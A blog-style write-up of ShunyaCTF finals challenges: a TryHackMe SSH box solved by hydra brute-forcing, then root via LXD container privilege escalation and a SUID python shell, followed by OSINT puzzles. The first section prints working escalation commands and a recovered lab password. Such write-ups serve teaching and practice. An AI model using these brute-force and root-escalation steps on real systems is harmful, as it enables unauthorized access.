---
title: ShunyaCTF Aarambha
time: 2024-07-05 12:00:00
categories: [CTF, WriteUps]
tags: [CTF, WriteUps]
image: /assets/posts/ShunyaCTF/0.png
---
![1](/assets/posts/ShunyaCTF/1.png)

Hello again, We’ll look at some of the challenges from **ShunyaCTF Aarambha Finals.** We, **`H7Tex`** got placed 8th overall. Congratulations to all Finalists. Really had a wonderful trip to Pune. Candid moment at the end.

First of all let’s address the elephant in the room. **Trust Issues**, which was the assigned the highest points with 1000. Looking at it now, it most definitely is solvable with proper enumeration which, we too missed in the first place haha.

```jsx
Authors: AbuCTF, Rohmat, MrGhost, MrRobot
```

## Miscellaneous

### Trust Issues

**Description**: Meet aalu. His friend told him to put a strong password on his SSH server and shared a Wikipedia article on munged password. Poor aalu was drunk and put a random word from the article as his password. fortunate for him, the password was at least 8 characters long. Go rock him, shock him.

**Given**: 

[TryHackMe | Cyber Security Training](https://tryhackme.com/r/room/trustissuesshunyactf)

**Author**: Tavish Negi

![2](/assets/posts/ShunyaCTF/2.png)

For some reason, we’ve been given this picture in the TryHackMe Room. What is King Baldwin the Fourth doing here? Ask the author. No Pun Indeed.

If you’re wondering what’s all this. Real.

![3](/assets/posts/ShunyaCTF/3.png)

Enough BS, once you deploy the machine in THM. Always NMap.

```jsx
abu@Abuntu:~/Documents/VPN/THMVPN$ nmap -A -p- -T4 -v 10.10.175.78
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-30 14:36 IST
Completed Connect Scan at 15:01, 1510.06s elapsed (65535 total ports)
Initiating Service scan at 15:01
Scanning 2 services on 10.10.175.78
Completed Service scan at 15:02, 0.69s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.175.78.
Initiating NSE at 15:02
Nmap scan report for 10.10.175.78
Host is up (0.31s latency).
Not shown: 65293 closed tcp ports (conn-refused), 240 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:3f:f4:b8:4a:d8:66:38:86:a4:0e:43:f6:a2:4b:0f (RSA)
|   256 2a:a9:a5:11:f8:32:19:3f:be:cc:e6:55:6f:46:9a:4c (ECDSA)
|_  256 4a:39:20:a4:44:48:f0:98:4e:72:3e:33:ee:bc:fb:20 (ED25519)
420/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:a7:59:35:53:9a:52:76:8d:98:96:19:97:6e:3a:f4 (RSA)
|   256 1a:0a:33:0f:44:7b:f7:22:e4:c2:56:38:31:ba:15:03 (ECDSA)
|_  256 a8:54:f2:e4:67:08:23:a5:09:c4:8b:f2:64:be:6e:37 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As usual, we too missed the 420 port in first try. Anyways, the Author is an absolute madman for making both ports 22 and 420 as SSH. Reading the description properly, we get to see that the drunkard Aalu took a random 8+ character word from the Wikipedia article on munged passwords. At this point, I was into Rev. My fully woke team-mates where running tools like `cewl` on the damn site, with `depth=2` and more. Which casually resulted in a very concise wordlist of **12k words** ! On top of that, they totally missed port 420. So, in summary, port 22 got absolutely obliterated with all the `hydra`  brute-forcing. Happens.

Then came Day 2, I looked this challenge up and gave it a try. Made a wordlist of 130 words with manual scraping from site, just copy paste stuff and finally appending 123 at the end.

Running `Hydra` on port 420, we get the juicy stuff.

```jsx
┌──(abu㉿Abuntu)-[~/Documents/CTF]
└─$ hydra -l aalu -P wordlist.txt ssh://10.10.167.114:420
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-05 06:25:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 139 login tries (l:1/p:139), ~9 tries per task
[DATA] attacking ssh://10.10.167.114:420/
[420][ssh] host: 10.10.167.114   login: aalu   password: protection123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-05 06:25:21
```

Boom, `login: aalu   password: protection123`

Go ahead and connect the the SSH machine.

```jsx
┌──(abu㉿Abuntu)-[~/Documents/CTF]
└─$ ssh aalu@10.10.167.114 -p 420
The authenticity of host '[10.10.167.114]:420 ([10.10.167.114]:420)' can't be established.
ED25519 key fingerprint is SHA256:/YC43QKFEmOPxmRMGDct9fvtDSTz9UwK0YJNRNLjh2U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.167.114]:420' (ED25519) to the list of known hosts.
aalu@10.10.167.114's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jul 2024 01:30:06 PM UTC

  System load:  0.0               Processes:             111
  Usage of /:   57.7% of 8.03GB   Users logged in:       0
  Memory usage: 27%               IPv4 address for eth0: 10.10.167.114
  Swap usage:   0%

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jun 27 12:57:50 2024 from 192.168.1.5
aalu@aalu-center:~$
```

Such satisfying feeling to gain access.

![4](/assets/posts/ShunyaCTF/4.gif)

After this, my genius of a team-mate: `Rohmat` ran through the whole thing and gained root access. We got the flag. `Privilege Escalation through LXD/LXC Groups.` Let’s learn about them.

The LXD/LXC group is **a Linux group that plays a crucial role in managing Linux containers using the LXD and LXC tools**. Members of this group have elevated privileges, allowing them to interact with LXD and LXC commands.
`LXC` is an abbreviation for Linux Containers, which is an operating system that is used for running multiple Linux systems virtually on a controlled host via a single Linux kernel. It allows the operation of any software or application in a virtual environment rather than on the physical system. The virtual environment functionality makes LXC more secure as well as cheaper.

`LXD`, on the other hand, stands for Linux Daemon, which is an extension that is mainly used for directing LXC. It is used to provide new attributes and capabilities to LXC so that LXC can be used in a more efficient manner.

Here's how it works:

1. **Containers**: Think of containers like small, isolated rooms where different activities happen without interfering with each other. These rooms can be set up, taken down, or modified by people in the "LXD/LXC group."
2. **Privilege Escalation**: This is a fancy way of saying "getting more power than you should have." Imagine if a regular student found a way to sneak into the principal's office by using a special key that only the privileged group has. That's what happens with privilege escalation.

In the computer world, if someone who is not supposed to have superpowers gets access to the "LXD/LXC group," they can use it to gain control over the whole computer. They can set up a container (a special room) that lets them see and do everything, just like the principal.

Steps to Escalate Privileges Using LXD/LXC:

1. **Join the LXD/LXC Group**: The person needs to be part of the LXD/LXC group. It's like getting a key to the special rooms.
2. **Create a Container**: They create a container with special settings. This container acts like a secret passage.
3. **Access Everything**: By using this container, they can access all the important parts of the computer, just like sneaking into the principal's office.

This is why it's important to make sure only trusted people are in the LXD/LXC group, just like only trusted students should have keys to the special rooms in the school.

Here’s `Rohmat’s` write-up for Privilege Escalation. Check it out at 

[Trust issues ShunyaCTF](https://hackctfs.blogspot.com/2024/07/trust-issues-shunyactf-shunyactf-2024.html)

Privilege Escalation

1) First we need to download and build alpine in our machine through git.

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

![5](/assets/posts/ShunyaCTF/5.png)

2 tar.gz files are created now

2) Move any of this tar.gz to target machine using `scp` or python server.

```bash
scp -P 420 alpine-v3.13-x86_64-20210218_0139.tar.gz aalu@10.10.194.93:/home/aalu/
```

![6](/assets/posts/ShunyaCTF/6.png)

3) Exploit it in target machine to get root shell.

3.1) Add it as an image to LXD

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz -alias myimage
```

3.2) Check list of images

![7](/assets/posts/ShunyaCTF/7.png)

3.3) To get privileged shell

```bash
     lxc init myimage ignite -c security.privileged=true
     lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
     lxc start ignite
     lxc exec ignite /bin/sh
     id
```

![8](/assets/posts/ShunyaCTF/8.png)

If this error occurs, execute: 

```bash
lxd init
```

Just keep the defaults when asked by clicking enter and when asked `Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]:`

Choose `dir` option.
Now execute this again after solving the error.

![9](/assets/posts/ShunyaCTF/9.png)

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

That's it, we got root now print out the root flag right. Developer be like: "Hahahaha Not that Easy".

![10](/assets/posts/ShunyaCTF/10.png)

Searching for flag file, turns out there are hundreds of them with fake flag.
Finally found how to get the flag by trail and error.

<img src="/assets/posts/ShunyaCTF/11.png" alt="p4" width="30%"/>

```bash
cd /mnt/root/root
ls -a|xargs cat * 2>/dev/null|grep shunya|grep -v fakeflag
```

![12](/assets/posts/ShunyaCTF/12.png)

Seems like there was another way to solve this challenge, 

**SUID (Set User ID)**

Shoutout to `PaiN05` and his blog. 

[Trust Issue — ShunyaCTF{Finals}](https://medium.com/@www.jaytiwari2121/trust-issue-shunyactf-finals-b0f4edda6570)

You can find SUID with this command.

```bash
aalu@aalu-center:~$ find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/mount
`/usr/local/bin/womp`
<Other SUID>
```

that `womp` SUID is the culprit. Seem like we can run python from it.

[python GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid)

![13](/assets/posts/ShunyaCTF/13.png)

```bash
aalu@aalu-center:~$ womp -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=1000(aalu) gid=1000(aalu) euid=0(root) groups=1000(aalu),4(adm),24(cdrom),30(dip),46(plugdev),117(lxd)
# cd /root	
# ls
<Bunch of Random Fake Flags>  snap
flag145.txt  flag190.txt  flag235.txt  flag281.txt  flag326.txt  flag371.txt  flag56.txt
```

Then extract the flag.

```bash
# ls -a|xargs cat * 2>/dev/null|grep shunya|grep -v fakeflag
shunyaCTF{1_10v3_h0n3y}
```

**Flag**: `shunyaCTF{1_10v3_h0n3y}`

## OSINT

### Dr. Homofomo

**Description:** Hey Detective, Dr. HOMOFOMO, a cryptologist, has gone underground after discovering a illegal encryption technique. Rumour has it, he’s left a digital trail that leads to his hidden online journal, which contains the secret formula. I've heard you’re good with finding things online. Your mission is to find the journal and uncover the secret.

**Given**: `homesweethome.pdf`

**Author**: Vaibhav Gawai [`FEL1X`]

After opening the PDF, you could see hidden text written at the top. I think about going into Google Lens, but that yielded nothing. `exiftool` gave two keywords - `DAGJf30TiCQ BAE8csRKboE.`

Which I had no clue whatsoever. Well if you look really closely.

![14](/assets/posts/ShunyaCTF/14.png)

We get a `v41bhx` , seems like a username! Let’s run it on 

[](https://whatsmyname.app/)

But be warned, there are so many rabbit holes in this challenge. Props to the Author.
We find a YouTube user with the same username.

![15](/assets/posts/ShunyaCTF/15.png)

![16](/assets/posts/ShunyaCTF/16.png)

That reveals another username `VAIBHAV13`. 

But there’s nothing here. Looking up the `v41bhx` on Discord. We find `FEL1X` , one of the ShunyaCTF organizers, cool guy irl. 

![17](/assets/posts/ShunyaCTF/17.png)

![17](/assets/posts/ShunyaCTF/17-5.png)

We finds two twitter accounts. One with same name as the challenge description.

![18](/assets/posts/ShunyaCTF/18.png)

The other one is a dupe. But still, `FEL1X` bhai, what is this behavior.

![19](/assets/posts/ShunyaCTF/19.png)

In the `@fullmoonFOMO` account, we find an unlisted YouTube video. 

```bash
HOMOFOMO
@fullmoonFOMO
·
Jun 29
https://youtu.be/jO-YaOoI7KI
want a hint ? 
 Why do I love coffee? It's my daily upgrade from glitchy NPC to main character, 
 hitting "refresh" on my brain and giving me the cheat code for adulting. 
 Coffee is the OG "glow up" in a cup. yk what that means, im just eating up your time😭
```

If we watch the full video, we find 2 QR links. At these timestamps. One is a dupe that takes you down a different rabbit hole. I ain’t going thorough that pain again. @12:24 in the video, we find this, 

![20](/assets/posts/ShunyaCTF/20.png)

Scanning gives you a password locked google forms. Author has disabled the link. But I saved the link haha. You just type the password as password, as hinted in the last frame of the video. You get the Flag !

[DR. HOMOFOMO](https://docs.google.com/forms/d/e/1FAIpQLSfX1NuQy71RhmOHR2INLUU1EPej2iyfO9Zrv_rCL1vKPa5Cfw/viewform?fbzx=6747858405585866679)

![21](/assets/posts/ShunyaCTF/21.png)

**Flag: `0CTF{H0MofOmO_Nev3R_3xi5sted}`**

### Math?

**Description**: Oh gosh, I'm trapped in this boring college, no fun, no clubs, just endless boring-fests. and yea I adore square millimeters, my university's vibes stat! Someone teleport me outta here! I miss my college (MIT-ADT) and those epic memories. I wish this college was as big as my previous one. Oh wait, how big was it? My STML (Short Term Memory Loss) always gets me. Help me fast! and yea I adore square millimeters—they never lie ❤

**Given: A locked `PasteBin` Link**

**Author: FEL1X**

![22](/assets/posts/ShunyaCTF/22.png)

Don’t mind the error on top LOL, but it looks something like this.

So answer to this first locked **pastebin** was `505857052800`.  Which gave us another locked pastebin and a riddle. Which hinted on Crimson Badges, giving us the answer as `REDHATHACKER`. Issues with the formatting. And that gave us the flag.

### Cosmic Conversion

**Description**: So, I had the pleasure of interning at NASA as a cosmic researcher. I trust it as hell , it's out of this world! anyways!!! Do you think OSINT challenges are just piece of cake? Prove you're not lost in space! Which of the celestial wonders is the nearest to our little blue planet? But beware, don’t even think about whipping , Forget parsecs—only Astronomical Units matter.—there’s only one measure that the cosmos recognizes. This flag entry is fishier than a neutron star is dense, so nail that integer distance precisely, or you'll get sucked into a galaxy of RABBIT HOLES! 🕳🐇

Flag format : 0CTF{onlynumbers}

Ex. 0ctf{2370837283728739273}

![23](/assets/posts/ShunyaCTF/23.png)

Shout-out to `MrGhost` for getting first blood on this challenge. Ping him on Discord to get the solution.

Here's a candid !

![14](/assets/posts/ShunyaCTF/14.jpg)

![Continue](/assets/posts/PrivEscalation/continue.jpg)